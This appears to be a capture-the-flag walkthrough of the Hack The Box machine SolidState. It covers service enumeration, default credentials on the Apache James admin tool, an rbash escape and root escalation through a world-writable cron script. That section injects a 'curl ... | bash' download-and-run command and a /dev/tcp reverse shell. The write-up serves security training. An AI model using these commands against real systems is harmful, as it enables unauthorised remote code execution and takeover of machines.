# HTB - SolidState
## Linux - Medium

### Enumeration

```
# Nmap 7.94SVN scan initiated Sun May 11 01:07:58 2025 as: nmap -sCV -oN nmap.txt -vv 10.10.10.51
Nmap scan report for 10.10.10.51
Host is up, received echo-reply ttl 63 (0.0081s latency).
Scanned at 2025-05-11 01:07:59 CDT for 113s
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp  open  smtp    syn-ack ttl 63 JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.7 [10.10.14.7])
80/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
110/tcp open  pop3    syn-ack ttl 63 JAMES pop3d 2.3.2
119/tcp open  nntp    syn-ack ttl 63 JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 11 01:09:52 2025 -- 1 IP address (1 host up) scanned in 113.44 seconds
```

- We see SMTP server with POP3 and nntp open.
- Lets first explore the website
- Running gobuster to check for hidden directories

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.51
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/assets               (Status: 301) [Size: 311] [--> http://10.10.10.51/assets/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.51/images/]
/index.html           (Status: 200) [Size: 7776]
/server-status        (Status: 403) [Size: 299]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Nothing interesting here.

Running nmap on all ports, we discover a new open port 4555

```
Nmap scan report for 10.10.10.51
Host is up, received echo-reply ttl 63 (0.0075s latency).
Scanned at 2025-05-11 01:14:43 CDT for 6s
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.55 seconds
           Raw packets sent: 65539 (2.884MB) | Rcvd: 65541 (2.622MB)
```

Lets run a script scan 

```
4555/tcp open  rsip?   syn-ack ttl 63
| fingerprint-strings:
|   GenericLines:
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for
|_    Login id:
```

This seems interesting, we have a APACHE James Server, which is a mail transfer agent

### Initial Foothold

Checking on google we see root/root is the most common default credential, we can login, lets see how to exploit this

```
└──╼ $nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

We can reset user passwords from this Administration tool and try to login using the resetted password, I am using Evolution mail client.

```
setpassword [username] [password]       sets a user's password
# We will use this command to reset the user password and try to login on Evolution mail client and check their inbox
setpassword james password
Password for james reset
# We dont see anything in James's Inbox, lets try another user
setpassword mindy password
Password for mindy reset
```

Interesting find in Mindy's inbox

![image](https://github.com/user-attachments/assets/8a4e8927-3aa2-4390-87ab-2fb408553ea0)

Lets see if we have ssh access with this password

```
echo 'mindy:P@55W0rd1!2@' >> creds.txt

└──╼ $nxc ssh 10.10.10.51 -u mindy -p 'P@55W0rd1!2@'
SSH         10.10.10.51     22     10.10.10.51      [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u1
SSH         10.10.10.51     22     10.10.10.51      [+] mindy:P@55W0rd1!2@  Linux - Shell access!

```

We can login but it looks like we are in a rbash shell

```
mindy@solidstate:~$ id
-rbash: id: command not found
mindy@solidstate:~$ whoami
-rbash: whoami: command not found
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
73bf52cb1dca3f436712e5e02bXXXXXX
mindy@solidstate:~$
```

### Lateral Movement

Checking online on how to escape rbash with ssh found this interesting way to bypass the rbash by just adding a -t to the ssh command

```
└──╼ $ssh mindy@10.10.10.51 -t 'bash --noprofile'
mindy@10.10.10.51's password:
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ pwd
/home/mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

### Privilege Escalation

Now we can run LinPEAS and other enum tools

Nothing interesesting in LinPEAS, lets try running some other enum script

PSPY - A process spy tool, which spits out running processes from memory

We find an interesting script which is running as root - 

```
2025/05/11 05:30:01 CMD: UID=0     PID=3095   | /bin/sh -c python /opt/tmp.py
2025/05/11 05:30:01 CMD: UID=0     PID=3096   | sh -c rm -r /tmp/*
2025/05/11 05:30:01 CMD: UID=0     PID=3097   | rm -r /tmp/*
```

Lets check this /opt/tmp.py script

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:~/tmp$ cd /opt
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$
```

The script is removing the contents of /tmp/ and checking the permiossions, it looks like we can just edit this file as everyone has *rwx* permissions on it. It will run again in sometime in the bg, lets inject a reverse shell payload

```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
#     os.system('rm -r /tmp/* ')
      os.system('curl 10.10.14.7:8000/pwn | bash')
      os.system('echo PWNED >> /root/PWNED')
except:
     sys.exit()
```

Now all we need to do is wait

We have a web server listening on port 8000 and have the reverse shell in a file pwn, then start the ncat listener to catch the reverse shell

```
└──╼ $cat pwn
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.7/9001 0>&1
```

PWNED

![image](https://github.com/user-attachments/assets/ad8a714a-cf70-47c8-8988-099c8fc008d0)



*PS: This flag wont work for you as each machine generates a random flag on startup.*

### Reference links
- https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
- https://github.com/DominicBreuker/pspy
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

